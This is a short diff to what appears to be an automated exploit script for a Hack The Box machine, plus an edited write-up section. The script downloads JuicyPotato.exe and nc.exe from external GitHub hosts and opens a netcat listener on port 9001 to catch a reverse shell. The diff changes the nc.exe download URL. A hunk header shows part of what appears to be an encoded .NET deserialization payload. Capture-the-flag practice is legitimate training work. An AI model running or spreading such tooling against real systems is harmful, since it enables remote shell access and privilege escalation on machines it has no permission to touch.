@@ -247,7 +247,7 @@ def main():
     print(colored("\n[+] Starting Attack\n", "red"))
     time.sleep(2)
     os.system("wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O /tmp/JuicyPotato.exe")
-    os.system("wget https://github.com/J3wker/DLLicous-MaliciousDLL/raw/master/Dependencies/nc.exe -O /tmp/nc.exe")
+    os.system("wget https://github.com/Scatter-Security/HTB/blob/master/nc.exe -O /tmp/nc.exe")
     time.sleep(2)
     print(colored("[+] Opening Listner", "green"))
     os.popen("gnome-terminal -- bash -c 'nc -lnvp 9001'")
@@ -355,3 +355,4 @@ ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNl
 
 
 ### Actions on Objective
+Flags exfiltrated.
